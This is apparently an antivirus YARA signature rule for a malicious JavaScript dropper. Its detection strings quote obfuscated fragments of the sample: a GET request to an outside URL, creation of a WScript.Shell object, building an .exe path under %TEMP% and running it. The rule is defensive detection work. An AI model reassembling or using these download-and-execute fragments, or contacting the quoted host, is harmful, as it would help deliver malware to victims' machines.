rule sig_20160330_e3b4d5135af103c88cc0761fdb849959 {
  meta:
    description = "datamaliciousorder - file 20160330_e3b4d5135af103c88cc0761fdb849959.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "27209c0cf67a29385953190cf2e6980a79301ec43a0e1aca111b14b833613aae"

  strings:
    $s1  = "_A0[_T](\"GET\", \"http://susiewest.com/u2w7q\", false);" fullword ascii
    $s2  = "var _W0 = function _LT() {return WScript[_A](\"WScript\"+\".Shell\");}(), _ND = 11;" fullword ascii
    $s3  = "function _VC(_C, _J){_P = _P * 1; return _C - _J;};" fullword ascii
    $s4  = "if (_A0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _GG() {return _W0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"LLulsDEnLvw.ex\" + \"e\";};" fullword ascii
    $s6  = "function _N(){return _NW + \"\";};" fullword ascii
    $s7  = "function _D(_QG){_W0[\"Run\"](_QG, _P, _P);};" fullword ascii
    $s8  = "function _IU() {return ((_GR == true) && (_GR == _MH)) ? 1 : _P;};" fullword ascii
    $s9  = "function _V(){return 22;};" fullword ascii
    $s10 = "function _WZ()" fullword ascii
    $s11 = "var _N1 = new this[\"Date\"]();" fullword ascii
    $s12 = "return _VC(_I, _PJ);" fullword ascii
    $s13 = "function _K(){return _A;};" fullword ascii
    $s14 = "function _JW(_JA) {var _W = (1, 2, 3, 4, 5, _JA); return _W;};" fullword ascii
    $s15 = " while (_QH){" fullword ascii
    $s16 = "_MH = true; " fullword ascii
    $s17 = "var _MH = false;" fullword ascii
    $s18 = "_GR = true; " fullword ascii
    $s19 = "var _GR = false;" fullword ascii
    $s20 = "var _GX = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}